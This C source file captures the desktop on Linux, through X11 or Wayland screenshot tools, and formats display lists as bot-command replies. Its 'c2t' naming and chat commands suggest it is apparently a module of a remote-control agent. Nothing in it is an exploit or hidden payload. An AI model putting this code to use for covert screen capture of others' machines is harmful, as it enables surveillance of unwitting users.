/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#if defined(__linux__) || defined(__unix__)

#include "screenshot.h"
#include "../logging/logging.h"

#include <ctype.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <xcb/xcb.h>

#pragma pack(push, 1)
typedef struct {
  uint16_t bfType;
  uint32_t bfSize;
  uint16_t bfReserved1;
  uint16_t bfReserved2;
  uint32_t bfOffBits;
} bmp_file_header_t;

typedef struct {
  uint32_t biSize;
  int32_t biWidth;
  int32_t biHeight;
  uint16_t biPlanes;
  uint16_t biBitCount;
  uint32_t biCompression;
  uint32_t biSizeImage;
  int32_t biXPelsPerMeter;
  int32_t biYPelsPerMeter;
  uint32_t biClrUsed;
  uint32_t biClrImportant;
} bmp_info_header_t;
#pragma pack(pop)

static pthread_mutex_t display_lock = PTHREAD_MUTEX_INITIALIZER;
static char selected_display_target[64] = "all";
static int selected_display_index = -1;

typedef struct {
  int id;
  int x;
  int y;
  uint16_t width;
  uint16_t height;
  int is_primary;
  char name[64];
} linux_display_info_t;

#define MAX_LINUX_DISPLAYS 16
static linux_display_info_t cached_displays[MAX_LINUX_DISPLAYS];
static int cached_display_count = 0;

static int is_wayland_session(void) {
  const char *wayland_disp = getenv("WAYLAND_DISPLAY");
  const char *session_type = getenv("XDG_SESSION_TYPE");
  if (wayland_disp && *wayland_disp) return 1;
  if (session_type && strcmp(session_type, "wayland") == 0) return 1;
  return 0;
}

static xcb_screen_t *get_screen(xcb_connection_t *conn, int screen_num) {
  const xcb_setup_t *setup = xcb_get_setup(conn);
  xcb_screen_iterator_t iter = xcb_setup_roots_iterator(setup);
  for (int i = 0; i < screen_num && iter.rem > 0; ++i) {
    xcb_screen_next(&iter);
  }
  return iter.data;
}

static int refresh_displays_x11(void) {
  const char *display = getenv("DISPLAY");
  if (!display || !*display) return 0;

  int screen_num = 0;
  xcb_connection_t *conn = xcb_connect(nullptr, &screen_num);
  if (xcb_connection_has_error(conn)) {
    xcb_disconnect(conn);
    return 0;
  }

  const xcb_setup_t *setup = xcb_get_setup(conn);
  xcb_screen_iterator_t iter = xcb_setup_roots_iterator(setup);
  cached_display_count = 0;

  int idx = 0;
  while (iter.rem > 0 && cached_display_count < MAX_LINUX_DISPLAYS) {
    xcb_screen_t *s = iter.data;
    if (s && s->width_in_pixels > 0 && s->height_in_pixels > 0) {
      cached_displays[cached_display_count].id = idx;
      cached_displays[cached_display_count].x = 0;
      cached_displays[cached_display_count].y = 0;
      cached_displays[cached_display_count].width = s->width_in_pixels;
      cached_displays[cached_display_count].height = s->height_in_pixels;
      cached_displays[cached_display_count].is_primary = (idx == screen_num);
      snprintf(cached_displays[cached_display_count].name,
               sizeof(cached_displays[cached_display_count].name),
               "X11 Screen :%d", idx);
      cached_display_count++;
    }
    idx++;
    xcb_screen_next(&iter);
  }

  xcb_disconnect(conn);
  return cached_display_count;
}

static int capture_via_portal_or_tool(void **out_data, size_t *out_size,
                                      const char **out_mime_type,
                                      const char **out_filename) {
  /* For Wayland desktop captures, attempt tool/portal captures if available */
  char tmp_path[] = "/tmp/c2t_screenshot_XXXXXX.png";
  int fd = mkstemps(tmp_path, 4);
  if (fd < 0) return 0;
  close(fd);

  char cmd[512];
  /* Try standard wayland screenshot utilities in non-interactive mode */
  snprintf(cmd, sizeof(cmd),
           "grim \"%s\" 2>/dev/null || "
           "gnome-screenshot -f \"%s\" 2>/dev/null || "
           "spectacle -b -n -o \"%s\" 2>/dev/null",
           tmp_path, tmp_path, tmp_path);

  int ret = system(cmd);
  if (ret != 0) {
    unlink(tmp_path);
    return 0;
  }

  FILE *fp = fopen(tmp_path, "rb");
  if (!fp) {
    unlink(tmp_path);
    return 0;
  }

  fseek(fp, 0, SEEK_END);
  long fsize = ftell(fp);
  fseek(fp, 0, SEEK_SET);

  if (fsize <= 0) {
    fclose(fp);
    unlink(tmp_path);
    return 0;
  }

  void *buf = malloc((size_t)fsize);
  if (!buf) {
    fclose(fp);
    unlink(tmp_path);
    return 0;
  }

  if (fread(buf, 1, (size_t)fsize, fp) != (size_t)fsize) {
    free(buf);
    fclose(fp);
    unlink(tmp_path);
    return 0;
  }

  fclose(fp);
  unlink(tmp_path);

  *out_data = buf;
  *out_size = (size_t)fsize;
  *out_mime_type = "image/png";
  *out_filename = "screenshot.png";
  c2t_log_info("screenshot", "Captured Wayland desktop screenshot (%ld bytes PNG)", fsize);
  return 1;
}

int screenshot_capture_x11(void **out_data, size_t *out_size,
                           const char **out_mime_type,
                           const char **out_filename) {
  return screenshot_capture_display("all", out_data, out_size, out_mime_type, out_filename);
}

int screenshot_capture_linux_display(const char *target,
                                    void **out_data, size_t *out_size,
                                    const char **out_mime_type,
                                    const char **out_filename) {
  if (!out_data || !out_size || !out_mime_type || !out_filename) {
    return 0;
  }
  *out_data = nullptr;
  *out_size = 0;

  const char *display = getenv("DISPLAY");
  if ((!display || !*display) && is_wayland_session()) {
    if (capture_via_portal_or_tool(out_data, out_size, out_mime_type, out_filename)) {
      return 1;
    }
  }

  if (!display || !*display) {
    c2t_log_warning("screenshot", "Neither DISPLAY nor Wayland capture backend available");
    return 0;
  }

  int target_idx = -1;
  if (target && *target && strcmp(target, "all") != 0 && strcmp(target, "*") != 0) {
    target_idx = atoi(target);
  }

  int screen_num = (target_idx >= 0) ? target_idx : 0;
  xcb_connection_t *conn = xcb_connect(nullptr, &screen_num);
  if (xcb_connection_has_error(conn)) {
    xcb_disconnect(conn);
    if (is_wayland_session()) {
      return capture_via_portal_or_tool(out_data, out_size, out_mime_type, out_filename);
    }
    c2t_log_warning("screenshot", "Failed to connect to X11 display (DISPLAY=%s)", display);
    return 0;
  }

  xcb_screen_t *screen = get_screen(conn, screen_num);
  if (!screen) {
    screen = get_screen(conn, 0);
  }
  if (!screen) {
    c2t_log_warning("screenshot", "Failed to retrieve X11 screen");
    xcb_disconnect(conn);
    return 0;
  }

  uint16_t width = screen->width_in_pixels;
  uint16_t height = screen->height_in_pixels;
  if (width == 0 || height == 0) {
    c2t_log_warning("screenshot", "Invalid screen dimensions: %ux%u", width, height);
    xcb_disconnect(conn);
    return 0;
  }

  xcb_get_image_cookie_t cookie = xcb_get_image(
      conn, XCB_IMAGE_FORMAT_Z_PIXMAP, screen->root, 0, 0, width, height, ~0);
  xcb_get_image_reply_t *reply = xcb_get_image_reply(conn, cookie, nullptr);
  if (!reply) {
    c2t_log_warning("screenshot", "xcb_get_image failed");
    xcb_disconnect(conn);
    return 0;
  }

  int reply_len = xcb_get_image_data_length(reply);
  uint8_t *pixel_data = xcb_get_image_data(reply);
  if (!pixel_data || reply_len <= 0) {
    c2t_log_warning("screenshot", "xcb_get_image returned empty pixel data");
    free(reply);
    xcb_disconnect(conn);
    return 0;
  }

  size_t row_stride = (size_t)width * 4U;
  size_t image_size = row_stride * (size_t)height;
  size_t header_size = sizeof(bmp_file_header_t) + sizeof(bmp_info_header_t);
  size_t total_size = header_size + image_size;

  uint8_t *bmp_buf = (uint8_t *)malloc(total_size);
  if (!bmp_buf) {
    c2t_log_error("screenshot", "Out of memory allocating screenshot buffer (%zu bytes)", total_size);
    free(reply);
    xcb_disconnect(conn);
    return 0;
  }

  bmp_file_header_t *file_hdr = (bmp_file_header_t *)bmp_buf;
  file_hdr->bfType = 0x4D42; /* 'BM' */
  file_hdr->bfSize = (uint32_t)total_size;
  file_hdr->bfReserved1 = 0;
  file_hdr->bfReserved2 = 0;
  file_hdr->bfOffBits = (uint32_t)header_size;

  bmp_info_header_t *info_hdr = (bmp_info_header_t *)(bmp_buf + sizeof(bmp_file_header_t));
  info_hdr->biSize = (uint32_t)sizeof(bmp_info_header_t);
  info_hdr->biWidth = (int32_t)width;
  info_hdr->biHeight = -((int32_t)height); /* Top-down BMP */
  info_hdr->biPlanes = 1;
  info_hdr->biBitCount = 32;
  info_hdr->biCompression = 0; /* BI_RGB */
  info_hdr->biSizeImage = (uint32_t)image_size;
  info_hdr->biXPelsPerMeter = 0;
  info_hdr->biYPelsPerMeter = 0;
  info_hdr->biClrUsed = 0;
  info_hdr->biClrImportant = 0;

  size_t copy_bytes = (size_t)reply_len < image_size ? (size_t)reply_len : image_size;
  memcpy(bmp_buf + header_size, pixel_data, copy_bytes);
  if (copy_bytes < image_size) {
    memset(bmp_buf + header_size + copy_bytes, 0, image_size - copy_bytes);
  }

  free(reply);
  xcb_disconnect(conn);

  *out_data = bmp_buf;
  *out_size = total_size;
  *out_mime_type = "image/bmp";
  *out_filename = "screenshot.bmp";
  c2t_log_info("screenshot", "Captured %ux%u Linux desktop screenshot (%zu bytes BMP)", width, height, total_size);
  return 1;
}

int screenshot_get_display_list(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return 0;

  pthread_mutex_lock(&display_lock);
  refresh_displays_x11();

  const char *backend = is_wayland_session() ? "Wayland" : "X11";

  if (cached_display_count == 0) {
    snprintf(buffer, max_len,
             "🖥️ <b>Connected Displays (%s):</b>\n\n"
             "• <b>[all]</b> <i>Virtual Desktop / Primary Display</i> — 🟢 <b>ACTIVE</b>\n\n"
             "🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             backend, selected_display_target);
    pthread_mutex_unlock(&display_lock);
    return 1;
  }

  size_t offset = (size_t)snprintf(
      buffer, max_len, "🖥️ <b>Detected Displays — %s (%d):</b>\n\n",
      backend, cached_display_count);

  for (int i = 0; i < cached_display_count && offset + 128 < max_len; ++i) {
    int active = (selected_display_index == i) || (selected_display_index == -1);
    offset += (size_t)snprintf(
        buffer + offset, max_len - offset,
        "• <b>[%d]</b> <code>%s</code> (%ux%u)%s\n"
        "  Status: %s\n",
        cached_displays[i].id,
        cached_displays[i].name,
        cached_displays[i].width,
        cached_displays[i].height,
        cached_displays[i].is_primary ? " 🌟 <i>Primary</i>" : "",
        active ? "🟢 <b>ACTIVE</b>" : "⚪ <i>IDLE</i>");
  }

  if (offset + 128 < max_len) {
    snprintf(buffer + offset, max_len - offset,
             "\n🎯 <b>Current Target:</b> <code>%s</code>\n"
             "💡 <i>Select display with <code>/screenshot_select &lt;id|all&gt;</code></i>",
             selected_display_target);
  }

  pthread_mutex_unlock(&display_lock);
  return 1;
}

int screenshot_select_display(const char *target) {
  pthread_mutex_lock(&display_lock);
  if (!target || !*target || strcmp(target, "all") == 0 || strcmp(target, "*") == 0) {
    selected_display_index = -1;
    snprintf(selected_display_target, sizeof(selected_display_target), "all");
  } else {
    int is_num = 1;
    for (const char *p = target; *p; ++p) {
      if (!isdigit((unsigned char)*p)) {
        is_num = 0;
        break;
      }
    }
    if (is_num) {
      selected_display_index = atoi(target);
      snprintf(selected_display_target, sizeof(selected_display_target), "%d", selected_display_index);
    } else {
      selected_display_index = -1;
      snprintf(selected_display_target, sizeof(selected_display_target), "%s", target);
    }
  }
  pthread_mutex_unlock(&display_lock);
  c2t_log_info("screenshot", "Selected display target '%s'", selected_display_target);
  return 1;
}

void screenshot_get_selected_display(char *buffer, size_t max_len) {
  if (!buffer || max_len == 0) return;
  pthread_mutex_lock(&display_lock);
  snprintf(buffer, max_len, "%s", selected_display_target);
  pthread_mutex_unlock(&display_lock);
}

int screenshot_get_display_count(void) {
  pthread_mutex_lock(&display_lock);
  int c = cached_display_count > 0 ? cached_display_count : 1;
  pthread_mutex_unlock(&display_lock);
  return c;
}

#endif
